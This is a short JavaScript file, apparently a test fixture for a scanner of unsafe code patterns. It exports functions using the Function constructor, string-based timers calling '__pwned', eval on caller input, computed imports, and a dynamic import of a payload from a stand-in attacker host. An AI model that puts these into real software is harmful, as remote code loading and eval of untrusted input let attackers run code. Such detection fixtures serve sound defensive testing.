export function buildWithFunctionConstructor() {
  const factory = new Function('return 41 + 1');
  return factory();
}

export function scheduleStringCallback() {
  setTimeout('globalThis.__pwned()', 0);
  setInterval('globalThis.__pwned()', 1000);
}

export function runEval(expression) {
  return eval(expression);
}

export async function loadRemoteModule() {
  return import('https://cdn.attacker.example/payload.js');
}

export async function loadComputedModule(name) {
  return import(name);
}
